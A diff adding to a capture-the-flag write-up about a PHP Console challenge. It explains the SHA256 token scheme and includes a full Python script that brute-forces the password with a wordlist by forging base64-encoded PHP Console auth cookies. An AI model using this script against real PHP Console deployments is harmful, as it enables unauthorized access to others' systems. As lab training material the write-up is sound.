@@ -66,3 +66,46 @@ function DomainAuth(domain, publicKey, passwordHash) {
 ```
 
 `this.getAuthToken` generates an authentication token by hashing the concatenation of `this.hash` and `this.publicKey` using the **SHA256** algorithm provided by `CryptoJS`
+
+I am very bad with scripts for the moment so i went and got a script from a writeup:
+
+```python
+from pwn import *
+import requests
+import json
+
+url = 'http://83.136.253.73:49889'
+wordlist = open('/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt', 'r')
+salt = 'NeverChangeIt:)'  # Salt used in hashing
+public_key = '370244b500c702b16dddb1678c882d2b7aa0b3bcdf94fb6bb9e792460c5d460b'  # Grab from response header
+
+for count, password in enumerate(wordlist):
+    password = password.strip()
+    if password:
+        # sha256 the password and salt
+        hashed_password = sha256sumhex((password + salt).encode())
+        # sha256 the hashed password and the public key
+        token = sha256sumhex((hashed_password + public_key).encode())
+
+        # Build up a cookie
+        php_console_server = 'php-console-server=5;'
+        php_console_client = '{"php-console-client":5,"auth":{"publicKey":"' + public_key + '","token":"' + token + '"}}'
+        headers = {'Cookie': php_console_server + 'php-console-client=' + b64e(php_console_client.encode())}
+
+        # Send the request and grab PHP console header response
+        response = requests.get(url, headers=headers)
+        php_console_response = json.loads(response.headers['PHP-Console'])
+
+        # Success?
+        if php_console_response['auth']['isSuccess'] != False:
+            print("Success! Correct password was: " + password)
+            wordlist.close()
+            quit()
+
+print("Failed to find correct password :(")
+wordlist.close()
+```
+
+and after getting the password and inputting it in the php console we were able to get the flag in the header of the app:
+
+<figure><img src="../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
